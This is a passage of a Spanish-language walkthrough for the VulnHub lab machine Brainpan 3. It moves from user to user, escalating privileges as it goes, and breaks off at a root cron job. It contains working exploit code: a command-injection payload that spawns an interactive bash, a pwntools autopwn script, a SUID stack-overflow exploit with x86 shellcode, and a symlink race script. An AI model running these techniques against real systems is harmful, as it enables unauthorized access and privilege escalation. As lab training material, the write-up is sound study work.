+[+] DATA SUCCESSFULLY RECORDED
+[+] RECORDED []</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos simplemente cambiar el id por <code class="language-plaintext highlighter-rouge">bash -i</code> obtenemos una bash interactiva</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ENTER COMMAND: 1
+SELECTED: 1
+
+ENTER REPORT, END WITH NEW LINE:
+
+$(bash -i >&2)
+
+REPORT [$(bash -i >&2)]
+SENDING TO REPORT MODULE
+
+bash: cannot set terminal process group (1281): Inappropriate ioctl for device  
+bash: no job control in this shell
+</span><span class="ve">anansi@brainpan3</span><span class="p">:</span><span class="az">/</span><span class="p">$ id
+uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)
+</span><span class="ve">anansi@brainpan3</span><span class="p">:</span><span class="az">/</span><span class="p">$ hostname -I
+192.168.100.64 
+</span><span class="ve">anansi@brainpan3</span><span class="p">:</span><span class="az">/</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora podemos agregar esta parte final al script y nos queda un pequeño <code class="language-plaintext highlighter-rouge">autopwn</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3</span><span class="p">
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote
+
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.64"</span><span class="p">, </span><span class="mi">1337</span><span class="p">)
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"CODE: "</span><span class="p">, </span><span class="no">b</span><span class="s">"%3$d"</span><span class="p">)
+
+shell.recvuntil(</span><span class="no">b</span><span class="s">"CODE: "</span><span class="p">)
+code </span><span class="o">= </span><span class="p">shell.recvline().strip()
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"CODE: "</span><span class="p">, code)
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"COMMAND: "</span><span class="p">, </span><span class="no">b</span><span class="s">"3"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"NAME: "</span><span class="p">, </span><span class="no">b</span><span class="s">"Y" </span><span class="o">* </span><span class="mi">253</span><span class="p">)
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"COMMAND: "</span><span class="p">, </span><span class="no">b</span><span class="s">"1"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"LINE:"</span><span class="p">, </span><span class="no">b</span><span class="s">"$(bash -i >&2)"</span><span class="p">)
+
+shell.recvuntil(</span><span class="no">b</span><span class="s">"shell</span><span class="mi">\n</span><span class="s">"</span><span class="p">)
+shell.interactive(</span><span class="s">""</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Aunque al ejecutarlo nos otorga directamente una <code class="language-plaintext highlighter-rouge">shell</code> como el usuario anansi es mejor hacerlo manual para poder tratar la <code class="language-plaintext highlighter-rouge">tty</code> y mejorar la interactividad de la shell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.64 on port 1337: Done
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+</span><span class="ve">anansi@brainpan3</span><span class="p">:</span><span class="az">/</span><span class="p">$ id
+uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)  
+</span><span class="ve">anansi@brainpan3</span><span class="p">:</span><span class="az">/</span><span class="p">$ hostname -I
+192.168.100.64 
+</span><span class="ve">anansi@brainpan3</span><span class="p">:</span><span class="az">/</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="shell-reynard">
+<br><h3 class="post-title">Shell - reynard</h3><br>
+
+<p class="plain-text">Buscando por archivos <code class="language-plaintext highlighter-rouge">suid</code> encontramos uno que llama bastante la atención ademas del clasico pkexec y es el binario <code class="language-plaintext highlighter-rouge">cryptor</code> el cual pertenece a <code class="language-plaintext highlighter-rouge">reynard</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">anansi@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p">$ find / -perm -u+s 2>/dev/null
+/usr/sbin/pppd
+/usr/sbin/uuidd
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/pt_chown
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/traceroute6.iputils
+/usr/bin/chfn
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/mtr
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/sudo
+/home/reynard/private/cryptor
+/bin/su
+/bin/ping
+/bin/fusermount
+/bin/mount
+/bin/umount
+/bin/ping6
+</span><span class="ve">anansi@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p">$ ls -l /home/reynard/private/cryptor
+-rwsr-xr-x 1 reynard reynard 5568 May 19  2015 </span><span class="err">/home/reynard/private/cryptor</span><span class="p">  
+</span><span class="ve">anansi@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Despues de copiarnos el binario a nuestro equipo podemos decompilarlo con <code class="language-plaintext highlighter-rouge">ida</code></p>
+<a href="/vulnhub/brainpan3/5.png" target="_blank"><div><p><img src="/vulnhub/brainpan3/5.png"></p></div></a>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">main</code> simplemente comprueba que se reciban <code class="language-plaintext highlighter-rouge">2</code> argumentos, si es asi llama a la funcion que llamamos <code class="language-plaintext highlighter-rouge">cryptor</code> con los parametros como argumentos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">int</span><span class="p"> __cdecl </span><span class="na">main</span><span class="p">(</span><span class="no">int </span><span class="am">argc</span><span class="p">, </span><span class="no">char </span><span class="o">**</span><span class="am">argv</span><span class="p">)
+{
+  </span><span class="o">if</span><span class="p"> ( argc </span><span class="o">> </span><span class="mi">2</span><span class="p"> )
+  {
+    cryptor(argv[</span><span class="mi">1</span><span class="p">], argv[</span><span class="mi">2</span><span class="p">]);
+    </span><span class="o">return </span><span class="mi">0</span><span class="p">;
+  }
+  </span><span class="o">else</span><span class="p">
+  {
+    printf(</span><span class="s">"Usage: </span><span class="mi">%s </span><span class="s">file key</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="o"> *</span><span class="p">argv);  
+    </span><span class="o">return </span><span class="mi">1</span><span class="p">;
+  }
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Resumiendo esta funcion primero define un <code class="language-plaintext highlighter-rouge">buffer</code> de 100 bytes en filename, despues si la longitud del primer argumento es <code class="language-plaintext highlighter-rouge">116</code> usa <code class="language-plaintext highlighter-rouge">strcpy</code> hacia <code class="language-plaintext highlighter-rouge">filename</code> bytes, mas adelante encontramos otro <code class="language-plaintext highlighter-rouge">strcpy</code> del 2do argumento hacia <code class="language-plaintext highlighter-rouge">outfile</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">int</span><span class="p"> __cdecl </span><span class="na">cryptor</span><span class="p">(</span><span class="no">int </span><span class="am">param_1</span><span class="p">, </span><span class="no">int </span><span class="am">param_2</span><span class="p">)
+{
+  </span><span class="no">int </span><span class="p">key; </span><span class="c1">// ebx
+  </span><span class="no">int </span><span class="p">character; </span><span class="c1">// eax
+  </span><span class="no">char </span><span class="p">filename[</span><span class="mi">100</span><span class="p">];</span><span class="c1"> // [esp+Ch] [ebp-78h] BYREF
+  </span><span class="no">int </span><span class="p">original; </span><span class="c1">// [esp+70h] [ebp-14h]
+  </span><span class="no">int </span><span class="p">i; </span><span class="c1">// [esp+74h] [ebp-10h]
+  </span><span class="no">int </span><span class="p">file; </span><span class="c1">// [esp+78h] [ebp-Ch]
+
+  </span><span class="no">memset</span><span class="p">(</span><span class="o">&</span><span class="p">outfile, </span><span class="mi">0</span><span class="p">, </span><span class="mi">100</span><span class="p">);
+  </span><span class="no">memset</span><span class="p">(filename, </span><span class="mi">0</span><span class="p">, </span><span class="no">sizeof</span><span class="p">(filename));
+  </span><span class="o">if</span><span class="p"> ( (</span><span class="no">unsigned int</span><span class="p">)</span><span class="no">strlen</span><span class="p">(param_1) </span><span class="o"><= </span><span class="mi">116</span><span class="p"> )
+    </span><span class="no">strcpy</span><span class="p">(filename, param_1);
+  </span><span class="o">else
+    </span><span class="no">strncpy</span><span class="p">(filename, param_1, </span><span class="mi">90</span><span class="p">);
+  </span><span class="no">strcat</span><span class="p">(filename, </span><span class="s">".enc"</span><span class="p">);
+  </span><span class="no">printf</span><span class="p">(</span><span class="s">"[+] saving to </span><span class="mi">%s\n</span><span class="s">"</span><span class="p">, filename);
+  </span><span class="no">strcpy</span><span class="p">(</span><span class="o">&</span><span class="p">outfile, param_2);
+  file </span><span class="o">= </span><span class="no">fopen</span><span class="p">(param_1, </span><span class="s">"r"</span><span class="p">);
+  </span><span class="o">if</span><span class="p"> ( file )
+  {
+    </span><span class="o">for</span><span class="p"> ( i </span><span class="o">= </span><span class="no">fopen</span><span class="p">(filename, </span><span class="s">"w"</span><span class="p">); ; </span><span class="no">fputc</span><span class="p">(character </span><span class="o">^ </span><span class="p">key, i) )  
+    {
+      original </span><span class="o">= </span><span class="no">fgetc</span><span class="p">(file);
+      </span><span class="o">if</span><span class="p"> ( original </span><span class="o">== -</span><span class="mi">1</span><span class="p"> )
+        </span><span class="o">break</span><span class="p">;
+      key </span><span class="o">=</span><span class="p"> (</span><span class="no">char</span><span class="p">)original;
+      character </span><span class="o">= </span><span class="no">atoi</span><span class="p">(param_2);
+    }
+    </span><span class="no">fclose</span><span class="p">(i);
+    </span><span class="no">fclose</span><span class="p">(file);
+  }
+  </span><span class="o">return </span><span class="mi">0</span><span class="p">;
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Mirando las protecciones del binario con <code class="language-plaintext highlighter-rouge">checksec</code> no encontramos ninguna activada</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ checksec </span><span class="p">cryptor
+[</span><span class="az">*</span><span class="p">] '/home/kali/cryptor'
+    Arch:     i386-32-little
+    RELRO:    </span><span class="am">Partial RELRO</span><span class="p">
+    Stack:    </span><span class="ro">No canary found</span><span class="p">
+    NX:       </span><span class="ro">NX disabled</span><span class="p">
+    PIE:      </span><span class="ro">No PIE (0x8048000)  </span><span class="p">
+    RWX:      </span><span class="ro">Has RWX segments</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Debido a las comprobaciones el primer <code class="language-plaintext highlighter-rouge">argumento</code> tendria que ser exactamente igual a <code class="language-plaintext highlighter-rouge">116</code> para que el programa se corrompa de lo contrario solo saldra sin problemas</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ gdb </span><span class="p">-q cryptor
+Reading symbols from </span><span class="ve">cryptor</span><span class="p">...
+(No debugging symbols found in cryptor)
+</span><span class="ro">pwndbg> </span><span class="p">run $(python2 -c 'print("A"*115)') BBBB
+Starting program: </span><span class="ve">/home/kali/cryptor</span><span class="p"> $(python2 -c 'print("A"*115)') BBBB
+Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".
+[+] saving to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.enc  
+</span><span class="ro">pwndbg> </span><span class="p">run $(python2 -c 'print("A"*117)') BBBB
+Starting program: </span><span class="ve">/home/kali/cryptor</span><span class="p"> $(python2 -c 'print("A"*117)') BBBB
+Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".
+[+] saving to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.enc
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si enviamos <code class="language-plaintext highlighter-rouge">116</code> bytes el programa se corrompe en algun punto de nuestras <code class="language-plaintext highlighter-rouge">A's</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg> </span><span class="p">run $(python2 -c 'print("A"*116)') BBBB
+Starting program: </span><span class="ve">/home/kali/cryptor </span><span class="p">$(python2 -c 'print("A"*116)') BBBB
+Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".
+[+] saving to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.enc  
+
+Program received signal SIGSEGV, Segmentation fault.
+</span><span class="az">0x41414141 </span><span class="p">in</span><span class="am"> ?? </span><span class="p">()
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El <code class="language-plaintext highlighter-rouge">strcpy</code> hacia <code class="language-plaintext highlighter-rouge">outfile</code> se hace en la direccion <code class="language-plaintext highlighter-rouge">0x804a080</code>, si miramos el valor de esa direccion en <code class="language-plaintext highlighter-rouge">gdb</code> nos encontraremos con el segundo argumento que son las <code class="language-plaintext highlighter-rouge">B</code></p>
+<a href="/vulnhub/brainpan3/6.png" target="_blank"><div><p><img src="/vulnhub/brainpan3/6.png"></p></div></a>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> x/wx 0x804a080
+</span><span class="az">0x804a080</span><span class="p">:	0x42424242  
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Crearemos un script que en el primer argumento envie <code class="language-plaintext highlighter-rouge">29</code> veces la cadena en little endian correspondiente a la direccion <code class="language-plaintext highlighter-rouge">0x804a080</code> para que sean los <code class="language-plaintext highlighter-rouge">116</code> bytes, y en el segundo un <a href="https://www.exploit-db.com/shellcodes/13628">shellcode</a> en x86 el cual nos ejecutara una <code class="language-plaintext highlighter-rouge">/bin/sh</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python2
+</span><span class="o">import </span><span class="p">struct
+
+p32 </span><span class="o">= lambda </span><span class="am">addr</span><span class="p">: struct.pack(</span><span class="s">"I"</span><span class="p">, addr)
+
+arg1 </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x804a080</span><span class="p">) </span><span class="o">* </span><span class="mi">29</span><span class="p">
+
+arg2 </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><span class="s">"</span><span class="p">  
+
+</span><span class="no">print</span><span class="p">(arg1 </span><span class="o">+</span><span class="s"> " " </span><span class="o">+</span><span class="p"> arg2)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">De esta manera en algun punto del primer argumento el <code class="language-plaintext highlighter-rouge">strcpy</code> nos enviara a la direccion <code class="language-plaintext highlighter-rouge">0x804a080</code> donde esta el segundo argumento el cual es el <code class="language-plaintext highlighter-rouge">shellcode</code> que al ejecutarlo nos dara una <code class="language-plaintext highlighter-rouge">/bin/sh</code> como el propietario que es el usuario <code class="language-plaintext highlighter-rouge">reynard</code></p>
+<a href="/vulnhub/brainpan3/10.png" target="_blank"><div><p><img src="/vulnhub/brainpan3/10.png"></p></div></a>
+
+<p class="plain-text">Finalmente ejecutamos el binario <code class="language-plaintext highlighter-rouge">cryptor</code> pasandole nuestro script ejecutado como argumento y conseguimos una <code class="language-plaintext highlighter-rouge">shell</code> como el usuario <code class="language-plaintext highlighter-rouge">reynard</code> en la maquina</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">anansi@brainpan3</span><span class="p">:</span><span class="az">/home/reynard/private</span><span class="p">$ ./cryptor $(python2 exploit.py)  
+[+] saving to �����������������������������.enc
+$ whoami
+reynard
+$ hostname -I
+192.168.100.64 
+$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para mejorar la shell podemos usar <code class="language-plaintext highlighter-rouge">python</code> y setear nuestro uid a <code class="language-plaintext highlighter-rouge">1002</code> que que es reynard para despues lanzarnos una <code class="language-plaintext highlighter-rouge">bash</code> donde trabajaremos de mas comodos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">$ python3</span><span class="p"> -q
+>>> </span><span class="p">import </span><span class="p">os
+>>> os.setreuid(</span><span class="p">1002</span><span class="p">,</span><span class="p">1002</span><span class="p">)
+>>> os.system(</span><span class="p">"bash"</span><span class="p">)
+</span><span class="ve">reynard@brainpan3</span><span class="p">:</span><span class="az">~/private</span><span class="p">$ id
+uid=1002(reynard) gid=1002(reynard) groups=1002(reynard)  
+</span><span class="ve">reynard@brainpan3</span><span class="p">:</span><span class="az">~/private</span><span class="p">$ hostname -I
+192.168.100.64 
+</span><span class="ve">reynard@brainpan3</span><span class="p">:</span><span class="az">~/private</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="shell-puck">
+<br><h3 class="post-title">Shell - puck</h3><br>
+
+<p class="plain-text">Si miramos los <code class="language-plaintext highlighter-rouge">puertos</code> dentro de la maquina podemos ver que hay un servicio corriendo en el puerto <code class="language-plaintext highlighter-rouge">7075</code>, al conectarnos con nc nos devuelve <code class="language-plaintext highlighter-rouge">Incorrect key</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">reynard@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p">$ netstat -nat
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:7075          0.0.0.0:*               LISTEN     
+tcp        0      0 192.168.100.64:1337     192.168.100.85:36100    ESTABLISHED  
+</span><span class="ve">reynard@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p">$ netcat 127.0.0.1 7075  
+Incorrect key
+</span><span class="ve">reynard@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En el directorio <code class="language-plaintext highlighter-rouge">/usr/local/sbin</code> encontramos un binario <code class="language-plaintext highlighter-rouge">trixd</code> que hace lo mismo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">reynard@brainpan3</span><span class="p">:</span><span class="az">/usr/local/sbin</span><span class="p">$ ls -l
+-rwxr-xr-x 1 root root 16589 May 26  2015 </span><span class="ve">brainpan3  </span><span class="p">
+-rwxr-xr-x 1 root root  7609 May 20  2015 </span><span class="ve">trixd</span><span class="p">
+-rwxr-xr-x 1 root root   343 May 21  2015 </span><span class="ve">www</span><span class="p">
+</span><span class="ve">reynard@brainpan3</span><span class="p">:</span><span class="az">/usr/local/sbin</span><span class="p">$ ./trixd 
+open: Permission denied
+Incorrect key
+</span><span class="ve">reynard@brainpan3</span><span class="p">:</span><span class="az">/usr/local/sbin</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nuevamente podemos decompilar el binario usando <code class="language-plaintext highlighter-rouge">ida</code> para ver si codigo en <code class="language-plaintext highlighter-rouge">C</code></p>
+<a href="/vulnhub/brainpan3/7.png" target="_blank"><div><p><img src="/vulnhub/brainpan3/7.png"></p></div></a>
+
+<p class="plain-text">Resumiendo lo que hace el codigo, comprueba que <code class="language-plaintext highlighter-rouge">/mnt/usb/key.txt</code> no tenga el bit de <code class="language-plaintext highlighter-rouge">setuid</code> activado, hace un pequeño <code class="language-plaintext highlighter-rouge">sleep</code> y despues compara el <code class="language-plaintext highlighter-rouge">key.txt</code> de <code class="language-plaintext highlighter-rouge">/mnt/usb/</code> con el de <code class="language-plaintext highlighter-rouge">/home/puck/</code>, si son iguales nos otorga una <code class="language-plaintext highlighter-rouge">/bin/sh</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">int</span><span class="p"> __cdecl </span><span class="na">main</span><span class="p">()
+{
+  </span><span class="no">int </span><span class="p">home_key; </span><span class="c1">// eax
+  </span><span class="no">int </span><span class="p">usb_key; </span><span class="c1">// eax
+  </span><span class="no">int </span><span class="p">comparison; </span><span class="c1">// ebx
+  </span><span class="no">void </span><span class="p">(</span><span class="o">*</span><span class="p">check)(</span><span class="no">void</span><span class="p">); </span><span class="c1">// edx
+  </span><span class="no">int </span><span class="p">result; </span><span class="c1">// eax
+  </span><span class="no">int </span><span class="p">key2; </span><span class="c1">// [esp+1Ch] [ebp-9Ch]
+  </span><span class="no">int </span><span class="p">key1; </span><span class="c1">// [esp+1Ch] [ebp-9Ch]
+  </span><span class="p">_DWORD attr[</span><span class="mi">2</span><span class="p">]; </span><span class="c1">// [esp+24h] [ebp-94h] BYREF
+  </span><span class="p">_WORD buffer1[</span><span class="mi">44</span><span class="p">]; </span><span class="c1">// [esp+2Ch] [ebp-8Ch] BYREF
+  </span><span class="p">_BYTE buffer2[</span><span class="mi">20</span><span class="p">]; </span><span class="c1">// [esp+84h] [ebp-34h] BYREF
+  </span><span class="p">_BYTE buffer3[</span><span class="mi">20</span><span class="p">]; </span><span class="c1">// [esp+98h] [ebp-20h] BYREF
+  </span><span class="no">unsigned int </span><span class="p">thread; </span><span class="c1">// [esp+ACh] [ebp-Ch]
+
+  </span><span class="p">thread </span><span class="o">=</span><span class="p"> __readgsdword(</span><span class="mi">0x14u</span><span class="p">);
+  </span><span class="o">if</span><span class="p"> ( ptrace(</span><span class="mi">0</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">1</span><span class="p">, </span><span class="mi">0</span><span class="p">) </span><span class="o">< </span><span class="mi">0 </span><span class="p">)
+  {
+    comparison </span><span class="o">= -</span><span class="mi">1</span><span class="p">;
+  }
+  </span><span class="o">else</span><span class="p">
+  {
+    </span><span class="no">setbuf</span><span class="p">(stdout, </span><span class="mi">0</span><span class="p">);
+    attr[</span><span class="mi">1</span><span class="p">]</span><span class="o"> = </span><span class="mi">1</span><span class="p">;
+    </span><span class="no">memset</span><span class="p">(buffer2, </span><span class="mi">0</span><span class="p">, </span><span class="no">sizeof</span><span class="p">(buffer2));
+    </span><span class="no">memset</span><span class="p">(buffer3, </span><span class="mi">0</span><span class="p">, </span><span class="no">sizeof</span><span class="p">(buffer3));
+    __lxstat(</span><span class="mi">3</span><span class="p">, </span><span class="s">"/mnt/usb/key.txt"</span><span class="p">, buffer1);
+    </span><span class="o">if</span><span class="p"> ( (buffer1[</span><span class="mi">8</span><span class="p">] </span><span class="o">& </span><span class="mi">0xF000</span><span class="p">) </span><span class="o">== </span><span class="mi">0xA000 </span><span class="p">)
+    {
+      comparison </span><span class="o">= -</span><span class="mi">1</span><span class="p">;
+      </span><span class="no">puts</span><span class="p">(</span><span class="s">"Key file is compromised."</span><span class="p">);
+    }
+    </span><span class="o">else</span><span class="p">
+    {
+      select(</span><span class="mi">1</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">0</span><span class="p">, attr);
+      home_key </span><span class="o">= </span><span class="p">open(</span><span class="s">"/home/puck/key.txt"</span><span class="p">,</span><span class="mi"> 0</span><span class="p">);
+      </span><span class="o">if</span><span class="p"> ( home_key </span><span class="o">< </span><span class="mi">0</span><span class="p"> )
+      {
+        key1 </span><span class="o">= </span><span class="p">home_key;
+        </span><span class="no">perror</span><span class="p">(</span><span class="s">"open"</span><span class="p">);
+        home_key </span><span class="o">= </span><span class="p">key1;
+      }
+      read(home_key, buffer2, </span><span class="mi">19</span><span class="p">);
+      usb_key </span><span class="o">= </span><span class="p">open(</span><span class="s">"/mnt/usb/key.txt"</span><span class="p">, </span><span class="mi">0</span><span class="p">);
+      </span><span class="o">if</span><span class="p"> ( usb_key </span><span class="o">< </span><span class="mi">0</span><span class="p"> )
+      {
+        key2 </span><span class="o">= </span><span class="p">usb_key;
+        </span><span class="no">perror</span><span class="p">(</span><span class="s">"open"</span><span class="p">);
+        usb_key </span><span class="o">= </span><span class="p">key2;
+      }
+      read(usb_key, buffer3, </span><span class="mi">19</span><span class="p">);
+      comparison </span><span class="o">= </span><span class="no">strcmp</span><span class="p">(buffer3, buffer2);
+      </span><span class="o">if</span><span class="p"> ( comparison )
+      {
+        comparison </span><span class="o">= </span><span class="mi">0</span><span class="p">;
+        </span><span class="no">puts</span><span class="p">(</span><span class="s">"Incorrect key"</span><span class="p">);
+      }
+      </span><span class="o">else</span><span class="p">
+      {
+        </span><span class="no">puts</span><span class="p">(</span><span class="s">"Authentication successful"</span><span class="p">);
+        </span><span class="no">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);
+      }
+    }
+  }
+  check </span><span class="o">= </span><span class="p">(</span><span class="no">void</span><span class="p"> (</span><span class="o">*</span><span class="p">)(</span><span class="no">void</span><span class="p">))(__readgsdword(</span><span class="mi">0x14u</span><span class="p">)</span><span class="o"> ^ </span><span class="p">thread);  
+  result </span><span class="o">= </span><span class="p">comparison;
+  </span><span class="o">if</span><span class="p"> ( check )
+    start(comparison, check);
+  </span><span class="o">return </span><span class="p">result;
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El hecho de que haga la comprobacion nos impide crear un <code class="language-plaintext highlighter-rouge">enlace simbolico</code> y conectarnos al puerto 7075, ya que nos dira que el archivo key esta <code class="language-plaintext highlighter-rouge">comprometido</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">reynard@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p">$ ln -s -f /mnt/usb/key.txt /mnt/usb/key.txt  
+</span><span class="ve">reynard@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p">$ netcat 127.0.0.1 7075
+Key file is compromised.
+</span><span class="ve">reynard@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos crear un script en <code class="language-plaintext highlighter-rouge">python</code> para que se conecte al puerto <code class="language-plaintext highlighter-rouge">7075</code> y despues de la comprobacion en ese pequeño margen de <code class="language-plaintext highlighter-rouge">tiempo</code> crear el enlace simbolico, de esta manera al hacer la comparacion seran iguales y nos dara la <code class="language-plaintext highlighter-rouge">/bin/sh</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">import </span><span class="p">os, socket, telnetlib
+
+os.remove(</span><span class="s">"/mnt/usb/key.txt"</span><span class="p">)
+
+session </span><span class="o">= </span><span class="p">socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
+session.connect((</span><span class="s">"127.0.0.1"</span><span class="p">, </span><span class="mi">7075</span><span class="p">))
+
+os.symlink(</span><span class="s">"/home/puck/key.txt"</span><span class="p">, </span><span class="s">"/mnt/usb/key.txt"</span><span class="p">)
+
+shell </span><span class="o">= </span><span class="p">telnetlib.Telnet()
+shell.sock </span><span class="o">= </span><span class="p">session
+shell.interact()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutarlo bypasseamos la <code class="language-plaintext highlighter-rouge">comprobacion</code> inicial y nos autentica correctamente, con esto obtenemos una <code class="language-plaintext highlighter-rouge">shell</code> esta vez como el usuario que lo corre, que es <code class="language-plaintext highlighter-rouge">puck</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">reynard@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p">$ python3 exploit.py  
+Authentication successful
+script /dev/null -c bash
+</span><span class="ve">puck@brainpan3</span><span class="p">:</span><span class="az">/</span><span class="p">$ id
+uid=1001(puck) gid=1001(puck) groups=1001(puck)
+</span><span class="ve">puck@brainpan3</span><span class="p">:</span><span class="az">/</span><span class="p">$ hostname -I
+192.168.100.64 
+</span><span class="ve">puck@brainpan3</span><span class="p">:</span><span class="az">/</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="shell-root">
+<br><h3 class="post-title">Shell - root</h3><br>
+
+<p class="plain-text">Revisando las tareas <code class="language-plaintext highlighter-rouge">cron</code> encontramos una llamada msg_admin la cual ejecuta el binario <code class="language-plaintext highlighter-rouge">msg_admin</code> pasandole como primer argumento <code class="language-plaintext highlighter-rouge">1</code> y en en el segundo cada uno de los archivos de extensión <code class="language-plaintext highlighter-rouge">.msg</code> que existen en <code class="language-plaintext highlighter-rouge">/opt/.messenger/</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">puck@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat /etc/cron.d/msg_admin
+* * * * * root cd /opt/.messenger; for i in *.msg; do /usr/local/bin/msg_admin 1 $i; rm -f $i; done  
